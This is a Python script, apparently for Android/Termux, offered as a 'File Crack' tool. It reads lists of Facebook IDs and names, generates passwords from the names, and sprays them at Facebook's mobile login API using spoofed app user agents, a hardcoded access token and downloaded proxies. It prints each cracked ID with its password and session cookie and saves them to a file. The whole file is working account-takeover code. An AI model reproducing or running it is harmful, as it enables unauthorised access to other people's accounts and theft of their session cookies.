import os



try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    from os import path,system
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python ARKEN.py')

import random
try:
   os.mkdir('/sdcard/ARKEN')
except:pass
def linex():
        print(f'{W}-----------------------------------------------{W}')




try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('proxies.txt','w').write(prox)
except Exception as e:
    print('')
proxies=open('proxies.txt','r').read().splitlines()

princp=[]
#-----------------------------------------------------#
usr=[]
android_models=[]
#-----------------------------------------------------#
bblack="\033[1;30m" 
M="\033[1;31m"       
H="\033[1;33m"               
byellow="\033[1;33m"     
bblue="\033[1;34m"        
P="\033[1;35m"               
C="\033[1;36m"          
B="\033[1;37m"       
G="\033[1;32m"              
R="\033[1;31m"
AA="\033[1;32m"
W="\033[1;37m"
BB="\033[1;31m"
CC="\033[1;36m"
X='\033[1;30m'
XX="\x1b[38;5;196m"
GGG="\x1b[38;5;214m"






  

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
#-----------------------------------------------------#
plogo = (f"""logo
""")
def clear():
    os.system('clear')
    print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;92m'
P = '\033[1;37m'
dc = random.choice([A,B,C,D,M,H,N,E,F,G,P])
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

import requests
import os,sys




import base64
logo = f"""
logo"""







oppo = random.choice(["CNM632", "CPH1114", "CPH1235", "CPH1451", "CPH1615", "CPH1664", "CPH1869", "CPH1929", "CPH1985",
    "CPH2048", "CPH2107", "CPH2238", "CPH2261", "CPH2331", "CPH2332", "CPH2351", "CPH2389", "CPH2451",
    "CPH2491", "CPH2513", "CPH2515", "CPH2519", "CPH2521", "CPH2523", "CPH2525", "CPH2529", "CPH2551",
    "CPH2569", "CPH2579", "CPH2589", "CPH2591", "CPH2643", "CPH3475", "CPH3669", "CPH3682", "CPH3731",
    "CPH3776", "CPH3785", "CPH4125", "CPH4275", "CPH4299", "CPH4395", "CPH4473", "CPH4987", "CPH5286",
    "CPH5841", "CPH5947", "CPH6178", "CPH6244", "CPH6271", "CPH6316", "CPH6519", "CPH6528", "CPH6697",
    "CPH7338", "CPH7364", "CPH7382", "CPH7532", "CPH7577", "CPH7948", "CPH7991", "CPH8153", "CPH8346",
    "CPH8347", "CPH8363", "CPH8393", "CPH8467", "CPH8472", "CPH8534", "CPH8686", "CPH8893", "CPH9177",
    "CPH9226", "CPH9659", "CPH9667", "CPH9716", "CPH9763", "CPH9839", "CPH9929", "Reno 10 5G", "Reno 10X",
    "Reno 10X Zoom", "Reno 2", "Reno 2F", "Reno 2Z", "Reno 3", "Reno 3 5G", "Reno 3 Lite", "Reno 3 Pro",
    "Reno 3A", "Reno 4 4G", "Reno 4 5G", "Reno 4 Lite", "Reno 4 Pro 4G", "Reno 4 Pro 5G", "Reno 4 SE 5G",
    "Reno 4F", "Reno 4Z 5G", "Reno 5", "Reno 5 5G","Reno 5 Lite", "Reno 5 Pro 5G", "Reno 5 Pro Plus 5G", "Reno 5A", "Reno 5F", "Reno 5G", "Reno 5K", "Reno 5K 5G",
    "Reno 5Z", "Reno 6", "Reno 6 Pro", "Reno 6 Pro 5G", "Reno 6 Pro Plus", "Reno 6 Z 5G", "Reno 7", "Reno 7 Pro",
    "Reno 7 SE", "Reno 7A", "Reno 7Z", "Reno 8", "Reno 8 Pro", "Reno 8 Pro+", "Reno 8 Z", "Reno 8T", "Reno 9",
    "Reno 9 Pro", "Reno 9 Pro+", "Reno A", "Reno Ace", "Reno Ace 2", "Reno K3", "Reno Z", "Reno2", "Reno5", "Reno8",
    "RX17 Neo"])
    
    
    



def ua1():
    ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.48.'+'122;FBBV/'+str(random.randint(1111111,9999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1456};FBLC/it'+'_IT;FBRV/27'+'3474118;FBCR/;FBMF'+'/OP'+'PO;FBBD/OPPO;FB'+'PN/com.facebook.katana;FB'+'DV/'+str(oppo)+';FBSV/10'+';FBBK/1;FBOP/1;FBC'+'A/arm64-v8a:;]'
    return ua 	
        
        
        
        
        
        

def sys():
            os.system('xdg-open https://www.facebook.com/MD.BAHA.UDDIN.SHANTO')
        

#---------------------------------------------------
def main():
            clear()
            print(f'[1] File Crack')
            print(f'[2] Create file')
            print(f'[3] Exit')
            linex()
            xd=input(f'select an option:')
            if xd in ['1','01']:
                clear()
                file = input(f'Put File Name : ')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print(f'File Location Not Found ')
                    time.sleep(1)
                    approval()
                clear()
                print(f'[1] Method 1 \x1b[1;92m(OPPO)\x1b[1;97m  ')
                linex()
                mthd=input(f'select an method: ')
                linex()
                plist = []
                clear()
                try:
                    ps_limit = int(input(f' How many password do you want to add : '))
                except:
                    ps_limit =1
                clear()
                for i in range(ps_limit):
                    plist.append(input(f'Password {i+1} : '))
                    linex()
                clear()
                print(f'Do You Went Show Cp Account? y/n ')
                linex()
                cx=input(f' select an menu: ')
                if cx in ['y','Y','yes','Yes','1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('Your accounts are saved in: /sdcard/RADORAKS')
                    linex()
                    print(f'Total accounts : '+total_ids+f' ')
                    print(f'The processing has been started')
                    linex()
                    for user in fo:
                        ids,names = user.split('|')
                        passlist = plist
                        if mthd in ['1','A']:
                            crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(f'The Process Has Completed')
                print(f'Total Ok/Cp: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(f'Press Enter To Back')
                os.system('python ant.py')
			
			


				

#——————————————————————————————#
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r %s M1 । :%s'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        user_agento = f"Dalvik/2.1.0 Linux; U; Android "+str(random.randrange(5,14))+"; "+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+" Build/QP1A."+str(random.randrange(111111,999999))+") [FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["Xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua1(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://'+'api'+'.facebook.com/method/auth.login'
                       # twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;32m<=>  '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'[🍪]{W}COOKIE : {G}'+coki)
                                        
                                        open('/sdcard/TEST/OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                      
                        
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
                
                
                
                
sys();main()